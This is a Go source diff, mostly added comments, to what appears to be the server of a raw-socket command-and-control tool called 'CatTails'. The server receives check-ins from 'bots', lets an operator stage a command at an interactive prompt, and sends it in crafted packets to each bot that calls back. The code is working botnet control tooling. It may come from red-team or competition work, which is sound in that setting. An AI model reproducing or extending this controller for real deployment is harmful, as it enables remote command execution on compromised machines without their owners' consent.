@@ -13,6 +13,7 @@ import (
 	"golang.org/x/sys/unix"
 )
 
+// Global to store staged command
 var stagedCmd string
 
 // Host defines values for a callback from a bot
@@ -27,15 +28,19 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 
 	// Forever loop to respond to bots
 	for {
+		// Block on reading from channel
 		bot := <-listen
+		// Check if there is a command to run
 		if stagedCmd != "" {
+			// Make a socket for sending
 			fd := cattails.NewSocket()
 			// Create packet
 			packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
-
+			// YEET
 			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
 			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
+			// Close the socket
 			unix.Close(fd)
 		}
 	}
@@ -44,10 +49,11 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 // ProcessPacket TODO:
 func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 
+	// Get data from packet
 	data := string(packet.ApplicationLayer().Payload())
-
 	payload := strings.Split(data, " ")
 
+	// Parse the values from the data
 	mac, err := net.ParseMAC(payload[2])
 	if err != nil {
 		log.Fatal(err)
@@ -64,11 +70,13 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	listen <- newHost
 }
 
+// Simple CLI to update the "stagedCmd" value
 func cli() {
 	for {
 		reader := bufio.NewReader(os.Stdin)
 		fmt.Print("CatTails> ")
 		stagedCmd, _ = reader.ReadString('\n')
+		// Trim the bullshit newlines
 		stagedCmd = strings.Trim(stagedCmd, "\n")
 		fmt.Println("[+] Staged CMD:", stagedCmd)
 	}
@@ -76,8 +84,10 @@ func cli() {
 
 func main() {
 
+	// Create a BPF vm for filtering
 	vm := cattails.CreateBPFVM(cattails.FilterRaw)
 
+	// Create a socket for reading
 	readfd := cattails.NewSocket()
 	defer unix.Close(readfd)
 
